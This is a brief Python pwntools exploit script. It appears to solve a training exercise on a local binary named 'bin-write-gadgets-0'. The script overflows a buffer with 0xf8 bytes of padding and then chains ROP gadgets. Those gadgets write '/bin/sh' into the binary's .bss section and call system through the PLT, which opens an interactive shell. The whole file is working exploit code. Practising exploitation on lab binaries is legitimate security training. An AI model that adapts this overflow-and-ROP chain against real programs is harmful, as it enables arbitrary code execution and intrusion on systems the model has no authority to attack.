from pwn import *

binary = "./ace-student/test-bins/bin-write-gadgets-0"
io = process(binary)
elf = ELF(binary)

write_prim = 0x4006e7
pop_r8 = 0x4006dd
pop_rsi_r15 = 0x400811

payload = b"A"*0xf8
payload += p64(pop_r8)
payload += p64(elf.bss())
payload += p64(pop_rsi_r15)
payload += b"/bin/sh\x00"
payload += p64(0xdeadbeef)
payload += p64(0x400813)
payload += p64(elf.bss())
#payload += p64(0x400546)
payload += p64(elf.plt["system"])

io.sendlineafter(b">>>", payload)

io.interactive()


